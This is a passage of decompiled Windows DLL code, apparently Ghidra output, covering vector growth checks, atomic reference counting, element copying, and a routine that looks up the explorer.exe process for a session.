    uVar3 = (param_1[2] - *param_1) / 0xc;
    if (0x15555555 - (uVar3 >> 1) < uVar3) {
      uVar3 = 0;
      if (uVar5 != 0) {
        uVar3 = uVar5;
      }
      FUN_10040770(uVar3);
      return;
    }
    uVar3 = uVar3 + (uVar3 >> 1);
    if (uVar3 < uVar5) {
      uVar3 = uVar5;
    }
    FUN_10040770(uVar3);
  }
  return;
}



/* Function: FUN_100408a0 */

void __thiscall FUN_100408a0(int *param_1,uint param_2)

{
  code *pcVar1;
  uint uVar2;
  
  if (param_2 <= (uint)(param_1[2] - param_1[1] >> 2)) {
    return;
  }
  if (param_2 <= 0x3fffffffU - (param_1[1] - *param_1 >> 2)) {
    uVar2 = param_1[2] - *param_1 >> 2;
    if (0x3fffffff - (uVar2 >> 1) < uVar2) {
      FUN_10018cb0();
      return;
    }
    FUN_10018cb0();
    return;
  }
  FUN_10056a6a("vector<T> too long");
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_10040920 */

void __fastcall FUN_10040920(undefined4 *param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  int iVar2;
  int *piVar3;
  undefined4 *puVar4;
  
  if (param_1 != param_2) {
    puVar4 = param_1 + 1;
    do {
      piVar3 = (int *)puVar4[1];
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar2 = *piVar3;
        *piVar3 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      piVar3 = (int *)*puVar4;
      if (piVar3 != (int *)0x0) {
        LOCK();
        iVar2 = *piVar3;
        *piVar3 = iVar2 + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(piVar3);
        }
      }
      puVar1 = puVar4 + 2;
      puVar4 = puVar4 + 3;
    } while (puVar1 != param_2);
  }
  return;
}



/* Function: FUN_10040970 */

void __fastcall FUN_10040970(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3)

{
  int *piVar1;
  
  if (param_1 != param_2) {
    do {
      if (param_3 != (undefined4 *)0x0) {
        *param_3 = *param_1;
        piVar1 = (int *)param_1[1];
        param_3[1] = piVar1;
        if (piVar1 != (int *)0x0) {
          LOCK();
          *piVar1 = *piVar1 + 1;
          UNLOCK();
        }
        piVar1 = (int *)param_1[2];
        param_3[2] = piVar1;
        if (piVar1 != (int *)0x0) {
          LOCK();
          *piVar1 = *piVar1 + 1;
          UNLOCK();
        }
      }
      param_1 = param_1 + 3;
      param_3 = param_3 + 3;
    } while (param_1 != param_2);
  }
  return;
}



/* Function: FUN_100409c0 */

undefined4 __fastcall FUN_100409c0(int param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 uVar4;
  uint uVar5;
  int local_c;
  uint local_8;
  
  uVar4 = 0xffffffff;
  if ((DAT_1009b594 & 1) == 0) {
    DAT_1009b594 = DAT_1009b594 | 1;
    FUN_1001ae50();
    FUN_10057b51(&LAB_100785a0);
  }
  if (DAT_1009b5a4 != (code *)0x0) {
    local_8 = 0;
    iVar1 = (*DAT_1009b5a4)(0,0,1,&local_c,&local_8);
    if (iVar1 != 0) {
      uVar5 = 0;
      if (local_8 != 0) {
        iVar1 = 0;
        uVar3 = local_8;
        while (((*(int *)(local_c + iVar1) != -1 && (param_1 != *(int *)(local_c + iVar1))) ||
               (iVar2 = FUN_1005bebf(*(undefined4 *)(local_c + 8 + iVar1),L"explorer.exe"),
               uVar3 = local_8, iVar2 != 0))) {
          uVar5 = uVar5 + 1;
          iVar1 = iVar1 + 0x10;
          if (uVar3 <= uVar5) {
            (*DAT_1009b5a0)(local_c);
            return 0xffffffff;
          }
        }
        uVar4 = *(undefined4 *)(local_c + 4 + uVar5 * 0x10);
      }
      (*DAT_1009b5a0)(local_c);
    }
  }
  return uVar4;
}



/* Function: FUN_10040a80 */
